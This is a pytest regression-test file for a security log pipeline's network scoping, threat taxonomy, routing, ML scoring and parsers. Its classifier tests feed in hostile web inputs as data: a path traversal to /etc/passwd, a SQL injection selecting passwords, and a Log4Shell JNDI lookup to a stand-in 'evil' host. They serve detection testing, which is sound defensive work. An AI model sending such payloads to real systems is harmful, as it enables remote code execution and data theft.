"""
Regression tests for the canonical taxonomy, network-scope resolution and the
two-axis ML scoring.

Each test here corresponds to a defect found by auditing the pipeline against
requirements (a)-(k). They exist to stop those defects returning.
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from backend.core.registry import default_registry
from backend.normalizer.netscope import NetworkScope, default_scope
from backend.normalizer.taxonomy import (
    SECURITY_RELEVANT,
    OCSFClass,
    ThreatClass,
    default_classifier,
)
from backend.pipeline.orchestrator import PipelineOrchestrator
from backend.router.event_router import default_router
from backend.sample_data import SAMPLE_LOGS


@pytest.fixture(scope="module")
def contexts():
    orch = PipelineOrchestrator(registry=default_registry)
    return {s["id"]: orch.process_sync(s["raw"]) for s in SAMPLE_LOGS}


# ---------------------------------------------------------------------------
# Network scope - RFC 5737 documentation ranges are NOT internal
# ---------------------------------------------------------------------------

class TestNetworkScope:
    """Python's ipaddress.is_private returns True for the RFC 5737
    documentation ranges, which are exactly what vendor sample logs use for
    external hosts. Relying on it made direction wrong on 11 of 12 samples."""

    @pytest.mark.parametrize("addr", ["203.0.113.45", "198.51.100.99", "192.0.2.10"])
    def test_documentation_ranges_are_external(self, addr):
        import ipaddress
        assert ipaddress.ip_address(addr).is_private is True  # the trap
        assert default_scope.is_internal(addr) is False       # the fix
        assert default_scope.scope_of(addr) == "documentation"

    @pytest.mark.parametrize("addr", ["10.0.1.20", "192.168.1.1", "172.16.5.4"])
    def test_rfc1918_is_internal(self, addr):
        assert default_scope.is_internal(addr) is True

    def test_public_address_is_external(self):
        assert default_scope.is_internal("8.8.8.8") is False
        assert default_scope.scope_of("8.8.8.8") == "external"

    def test_direction(self):
        assert default_scope.direction("203.0.113.45", "10.0.1.20") == "INBOUND"
        assert default_scope.direction("10.0.4.88", "8.8.8.8") == "OUTBOUND"
        assert default_scope.direction("10.0.1.5", "10.0.2.7") == "INTERNAL"

    def test_unknown_when_address_unparseable(self):
        assert default_scope.is_internal("not-an-ip") is None
        assert default_scope.direction("not-an-ip", "10.0.0.1") == "UNKNOWN"

    def test_estate_is_configurable(self):
        """Internal is a property of a deployment, not of an address."""
        scope = NetworkScope(internal_networks=["203.0.113.0/24"])
        assert scope.is_internal("203.0.113.45") is True
        assert scope.is_internal("10.0.0.1") is False

    def test_vendor_direction_values_are_not_blindly_trusted(self):
        """PAN-OS emits client-to-server, Zeek emits orig/resp. Accepting those
        as canonical values would make the canonical field not canonical."""
        assert default_scope.direction(
            "203.0.113.45", "10.0.1.20", explicit="client-to-server"
        ) == "INBOUND"


# ---------------------------------------------------------------------------
# Taxonomy - requirement (c)
# ---------------------------------------------------------------------------

class TestTaxonomy:

    def test_ocsf_class_category_mapping_is_total(self):
        for cls in OCSFClass:
            assert cls.category is not None
            assert cls.label

    def test_refuses_to_guess_without_signal(self):
        result = default_classifier.classify()
        assert result.threat_class is ThreatClass.UNCLASSIFIED
        assert result.confidence == 0.0

    def test_every_classification_carries_evidence(self, contexts):
        for sid, ctx in contexts.items():
            evidence = ctx.normalized_event.classification["evidence"]
            assert evidence, f"{sid} produced no evidence"
            for item in evidence:
                assert {"signal", "observed", "contributes", "weight"} <= set(item)

    def test_windows_event_id_is_exact(self):
        result = default_classifier.classify(windows_event_id=4625)
        assert result.ocsf_class is OCSFClass.AUTHENTICATION
        assert result.threat_class is ThreatClass.AUTHENTICATION_ATTACK
        assert "T1110" in result.mitre_techniques

    def test_uri_attack_patterns(self):
        for uri, expected in [
            ("/../../../../etc/passwd", ThreatClass.WEB_EXPLOIT),
            ("/x?id=1 UNION SELECT password FROM users", ThreatClass.WEB_EXPLOIT),
            ("/?q=${jndi:ldap://evil/a}", ThreatClass.WEB_EXPLOIT),
            ("/.git/config", ThreatClass.RECONNAISSANCE),
        ]:
            assert default_classifier.classify(uri=uri).threat_class is expected

    def test_application_beats_port_for_ocsf_class(self):
        """A device that names the application has done L7 inspection and is
        more trustworthy than a port-number heuristic."""
        result = default_classifier.classify(app="dns", dst_port=443)
        assert result.ocsf_class is OCSFClass.DNS_ACTIVITY

    def test_permitted_traffic_is_benign(self):
        result = default_classifier.classify(action="ALLOW", dst_port=443, app="https")
        assert result.threat_class is ThreatClass.BENIGN_TRAFFIC
        assert not result.is_security_relevant

    def test_no_sample_emits_a_junk_category(self, contexts):
        """Previously the taxonomy emitted 'ANY' (a Palo Alto URL category) and
        the literal string '0', because it passed through a vendor field."""
        valid = {t.value for t in ThreatClass}
        for sid, ctx in contexts.items():
            category = ctx.normalized_event.event.category
            assert category in valid, f"{sid} emitted junk category {category!r}"

    def test_direction_correct_on_all_samples(self, contexts):
        assert contexts["cisco_asa_smb_sweep"].normalized_event.network.direction == "INBOUND"
        assert contexts["suricata_dns_tunneling"].normalized_event.network.direction == "OUTBOUND"
        for sid, ctx in contexts.items():
            assert ctx.normalized_event.network.direction != "INTERNAL" or sid == "_none_"

    def test_known_attack_samples_classify_correctly(self, contexts):
        expected = {
            "palo_alto_threat_sqli": ThreatClass.WEB_EXPLOIT,
            "suricata_dns_tunneling": ThreatClass.DATA_EXFILTRATION,
            "windows_failed_logon": ThreatClass.AUTHENTICATION_ATTACK,
            "nginx_path_traversal": ThreatClass.WEB_EXPLOIT,
            "cisco_asa_smb_sweep": ThreatClass.RECONNAISSANCE,
        }
        for sid, want in expected.items():
            got = contexts[sid].normalized_event.classification["threat_class"]
            assert got == want.value, f"{sid}: expected {want.value}, got {got}"

    def test_benign_samples_classify_as_benign(self, contexts):
        for sid in ("cisco_asa_normal_http", "palo_alto_traffic_normal", "zeek_conn_log"):
            got = contexts[sid].normalized_event.classification["threat_class"]
            assert got == ThreatClass.BENIGN_TRAFFIC.value, f"{sid} -> {got}"


# ---------------------------------------------------------------------------
# Routing - requirement (g)
# ---------------------------------------------------------------------------

class TestRouting:

    def test_router_categories_derive_from_taxonomy(self):
        """These were two hand-maintained lists that had drifted apart, making
        the router's category rule dead code on every event."""
        assert default_router.SIEM_CATEGORIES == frozenset(t.value for t in SECURITY_RELEVANT)

    def test_category_rule_actually_fires(self, contexts):
        fired = 0
        for ctx in contexts.values():
            category = ctx.normalized_event.event.category
            if category.lower() in default_router.SIEM_CATEGORIES:
                fired += 1
        assert fired > 0, "router category rule is dead code again"

    def test_benign_traffic_is_not_routed_to_siem(self, contexts):
        for sid in ("cisco_asa_normal_http", "palo_alto_traffic_normal", "zeek_conn_log"):
            ctx = contexts[sid]
            n, m = ctx.normalized_event, ctx.ml_event
            decision = default_router.classify(
                m.ml.anomaly_score, n.event.category, n.event.action.value,
                n.destination.port, n.event.severity.value,
            )
            assert not decision.siem, f"{sid} wrongly routed to SIEM"

    def test_every_siem_decision_has_a_reason(self, contexts):
        for sid, ctx in contexts.items():
            n, m = ctx.normalized_event, ctx.ml_event
            decision = default_router.classify(
                m.ml.anomaly_score, n.event.category, n.event.action.value,
                n.destination.port, n.event.severity.value,
            )
            if decision.siem:
                assert decision.reasons, f"{sid} routed to SIEM with no reason"

    def test_all_events_always_reach_the_data_lake(self, contexts):
        for ctx in contexts.values():
            n, m = ctx.normalized_event, ctx.ml_event
            decision = default_router.classify(
                m.ml.anomaly_score, n.event.category, n.event.action.value,
                n.destination.port, n.event.severity.value,
            )
            assert decision.data_lake is True


# ---------------------------------------------------------------------------
# ML honesty - requirement (h)
# ---------------------------------------------------------------------------

class TestMLHonesty:

    def test_scores_are_not_pinned_to_a_constant(self, contexts):
        """Four of twelve events previously came out at exactly 0.850 because
        hardcoded max() floors overrode the model."""
        scores = [c.ml_event.ml.anomaly_score for c in contexts.values()]
        from collections import Counter
        assert Counter(scores).most_common(1)[0][1] <= 3

    def test_confidence_is_not_hardcoded(self, contexts):
        """Confidence was previously 0.94 on every event forever."""
        confidences = {c.ml_event.ml.confidence for c in contexts.values()}
        assert 0.94 not in confidences or len(confidences) > 1

    def test_cold_start_is_reported_not_hidden(self, contexts):
        ctx = next(iter(contexts.values()))
        extra = getattr(ctx.ml_event.ml, "__ulpf_extra__", {})
        assert extra["model_state"] in ("cold_start", "fitted")
        if extra["model_state"] == "cold_start":
            assert extra["model_anomaly_score"] == 0.0
            assert ctx.ml_event.ml.confidence < 0.60

    def test_rule_and_model_axes_reported_separately(self, contexts):
        for ctx in contexts.values():
            extra = getattr(ctx.ml_event.ml, "__ulpf_extra__", {})
            assert "rule_risk_score" in extra
            assert "model_anomaly_score" in extra

    def test_benign_traffic_scores_low(self, contexts):
        for sid in ("cisco_asa_normal_http", "palo_alto_traffic_normal", "zeek_conn_log"):
            score = contexts[sid].ml_event.ml.anomaly_score
            assert score < 0.35, f"{sid} scored {score}, benign traffic should be low"


# ---------------------------------------------------------------------------
# Lossless preservation - requirements (a) and (d)
# ---------------------------------------------------------------------------

class TestLossless:

    def test_raw_payload_is_byte_identical(self, contexts):
        for s in SAMPLE_LOGS:
            assert contexts[s["id"]].normalized_event.raw.payload == s["raw"]

    def test_sha256_is_reproducible(self, contexts):
        import hashlib
        for s in SAMPLE_LOGS:
            digest = hashlib.sha256(s["raw"].encode("utf-8")).hexdigest()
            assert contexts[s["id"]].normalized_event.raw.sha256_hash == digest

    def test_event_id_links_every_stage(self, contexts):
        for ctx in contexts.values():
            eid = ctx.raw_event.event_id
            assert ctx.parsed_event.event_id == eid
            assert ctx.normalized_event.event_id == eid
            assert ctx.ml_event.event_id == eid


# ---------------------------------------------------------------------------
# Parser robustness - requirement (b)
# ---------------------------------------------------------------------------

class TestParserRobustness:

    def test_panos_column_misalignment_is_detected(self):
        """A single missing column shifts every field after it. Positional
        parsing without an arity check reported the byte count as the action."""
        from backend.ingestion.engine import IngestionEngine
        from backend.parsers.palo_alto import PaloAltoParser

        truncated = "1,2026/09/01 01:20:00,001801000001,TRAFFIC,end,1,2026/09/01 01:20:00,10.0.2.15,8.8.8.8"
        raw = IngestionEngine().ingest(raw_text=truncated)
        parsed = PaloAltoParser().parse(raw)

        assert parsed.extracted_fields["_field_alignment_verified"] is False
        assert "_parse_warning" in parsed.extracted_fields

    def test_wellformed_panos_traffic_log_aligns(self, contexts):
        fields = contexts["palo_alto_traffic_normal"].parsed_event.extracted_fields
        assert fields["_field_alignment_verified"] is True
        assert fields["action"] == "allow"
        assert fields["protocol"] == "udp"
        assert fields["dst_port"] == 53

    def test_vendor_status_codes_resolve_to_an_action(self, contexts):
        """Cisco ASA emits a numeric mnemonic and Zeek a conn_state; neither
        emits a literal action word."""
        assert contexts["cisco_asa_normal_http"].normalized_event.event.action.value == "ALLOW"
        assert contexts["zeek_conn_log"].normalized_event.event.action.value == "ALLOW"


# ---------------------------------------------------------------------------
# Adaptive template parser - requirements (e) and (i)
# ---------------------------------------------------------------------------

class TestAdaptiveParser:
    """Drain-based structure inference for sources ULPF has never seen.
    He et al., ICWS 2017; best-performing parser at scale per Jiang et al.,
    ISSTA 2024."""

    ALIEN = [
        "|MERIDIAN-IPS|4412|DROP|dmz->core|203.0.113.9%44210|10.0.7.4%445|sig-2201|SMB probe|",
        "|MERIDIAN-IPS|4413|DROP|dmz->core|198.51.100.4%33112|10.0.7.4%3389|sig-2290|RDP probe|",
        "|MERIDIAN-IPS|4414|DROP|dmz->core|203.0.113.7%41001|10.0.7.9%445|sig-2201|SMB probe|",
    ]

    def _parse_all(self):
        from backend.ingestion.engine import IngestionEngine
        from backend.parsers.adaptive import AdaptiveTemplateParser
        ing, parser = IngestionEngine(), AdaptiveTemplateParser()
        return parser, [parser.parse(ing.ingest(raw_text=line)) for line in self.ALIEN]

    def test_learns_one_template_from_similar_lines(self):
        parser, _ = self._parse_all()
        assert parser.tree.stats()["templates"] == 1

    def test_variable_positions_become_wildcards(self):
        parser, _ = self._parse_all()
        template = parser.tree.clusters[0].template
        assert "<IP>" in template and "<NUM>" in template
        # SMB vs RDP differ, so that position must have been widened.
        assert "<*>" in template

    def test_constant_tokens_survive(self):
        parser, _ = self._parse_all()
        assert "MERIDIAN-IPS" in parser.tree.clusters[0].template
        assert "DROP" in parser.tree.clusters[0].template

    def test_confidence_never_outranks_a_purpose_built_parser(self):
        _, parsed = self._parse_all()
        for p in parsed:
            assert p.confidence_score <= 0.55

    def test_never_selected_when_a_real_parser_matches(self, contexts):
        for sid, ctx in contexts.items():
            assert ctx.parsed_event.parser_name != "adaptive_template", (
                f"{sid} fell back to the adaptive parser"
            )

    def test_selected_for_a_genuinely_unknown_format(self):
        orch = PipelineOrchestrator(registry=default_registry)
        ctx = orch.process_sync(self.ALIEN[0])
        assert ctx.parsed_event.parser_name == "adaptive_template"

    def test_unknown_source_stays_lossless(self):
        orch = PipelineOrchestrator(registry=default_registry)
        ctx = orch.process_sync(self.ALIEN[0])
        assert ctx.normalized_event.raw.payload == self.ALIEN[0]

    def test_unknown_source_is_not_confidently_classified(self):
        """Structure without semantics must not become a confident threat call."""
        orch = PipelineOrchestrator(registry=default_registry)
        ctx = orch.process_sync(self.ALIEN[0])
        classification = ctx.normalized_event.classification
        assert classification["threat_class"] == ThreatClass.UNCLASSIFIED.value
        assert classification["confidence"] == 0.0
        # Low DQI is the signal that a mapping rule is needed for this source.
        assert ctx.validated_event.data_quality_score < 60

    def test_template_space_is_bounded(self):
        """An unbounded template space is a memory-exhaustion risk on
        adversarial or highly variable input."""
        from backend.parsers.adaptive import DrainTree
        tree = DrainTree(max_clusters=5)
        for i in range(50):
            tree.add([f"unique{i}", f"token{i}", f"value{i}"])
        assert tree.stats()["templates"] <= 5
        assert tree.stats()["saturated"] is True

    def test_masking_handles_common_variable_types(self):
        from backend.parsers.adaptive import preprocess
        masked, _ = preprocess(
            "conn 10.0.0.1 at 2026-09-01T01:00:00Z id 550e8400-e29b-41d4-a716-446655440000 flags 0xFF"
        )
        for placeholder in ("<IP>", "<TIMESTAMP>", "<UUID>", "<HEX>"):
            assert placeholder in masked
